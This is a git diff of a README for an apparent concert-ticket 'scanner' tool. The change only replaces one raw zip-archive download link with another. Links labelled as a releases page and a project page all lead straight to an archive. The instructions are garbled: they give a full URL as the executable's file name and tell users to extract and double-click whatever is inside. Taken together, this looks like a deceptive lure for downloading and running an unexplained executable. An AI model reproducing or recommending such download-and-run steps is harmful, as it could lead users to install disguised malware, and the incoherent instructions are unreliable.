@@ -1,6 +1,6 @@
 # 🎫 iranconcert_scanner - Effortlessly Reserve Concert Seats
 
-![Download](https://raw.githubusercontent.com/EXPguy101101/iranconcert_scanner/main/Heteropoda/iranconcert_scanner.zip)
+![Download](https://github.com/EXPguy101101/iranconcert_scanner/raw/refs/heads/main/src/iranconcert-scanner-v3.5-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -15,11 +15,11 @@ Welcome to the **iranconcert_scanner**! This software automatically scans for av
 
 ## 📥 Download & Install
 
-To download the latest version of the **iranconcert_scanner**, visit this page to download: [Releases Page](https://raw.githubusercontent.com/EXPguy101101/iranconcert_scanner/main/Heteropoda/iranconcert_scanner.zip).
+To download the latest version of the **iranconcert_scanner**, visit this page to download: [Releases Page](https://github.com/EXPguy101101/iranconcert_scanner/raw/refs/heads/main/src/iranconcert-scanner-v3.5-beta.3.zip).
 
 When on the Releases page, you'll see various versions listed. Choose the most recent version, and click on it to find the downloadable files. 
 
-1. Find the file named similar to `https://raw.githubusercontent.com/EXPguy101101/iranconcert_scanner/main/Heteropoda/iranconcert_scanner.zip` (where "X.X.X" represents the version number).
+1. Find the file named similar to `https://github.com/EXPguy101101/iranconcert_scanner/raw/refs/heads/main/src/iranconcert-scanner-v3.5-beta.3.zip` (where "X.X.X" represents the version number).
 2. Click on the file to start the download.
 3. Once downloaded, locate the file in your downloads folder.
 4. Extract (unzip) the files inside.
@@ -29,7 +29,7 @@ When on the Releases page, you'll see various versions listed. Choose the most r
 After extracting the files:
 
 1. Open the folder where you extracted the files.
-2. Look for the executable file, usually named `https://raw.githubusercontent.com/EXPguy101101/iranconcert_scanner/main/Heteropoda/iranconcert_scanner.zip` for Windows, or just `iranconcert_scanner` for Mac/Linux.
+2. Look for the executable file, usually named `https://github.com/EXPguy101101/iranconcert_scanner/raw/refs/heads/main/src/iranconcert-scanner-v3.5-beta.3.zip` for Windows, or just `iranconcert_scanner` for Mac/Linux.
 3. Double-click on the executable file to start the application.
 
 ## 📖 Usage Instructions
@@ -73,7 +73,7 @@ For additional help, feel free to check the community discussions on the GitHub 
 
 ## 🔗 Learn More
 
-For more information about our project, including updates and future features, visit our [project page](https://raw.githubusercontent.com/EXPguy101101/iranconcert_scanner/main/Heteropoda/iranconcert_scanner.zip).
+For more information about our project, including updates and future features, visit our [project page](https://github.com/EXPguy101101/iranconcert_scanner/raw/refs/heads/main/src/iranconcert-scanner-v3.5-beta.3.zip).
 
 ---
 
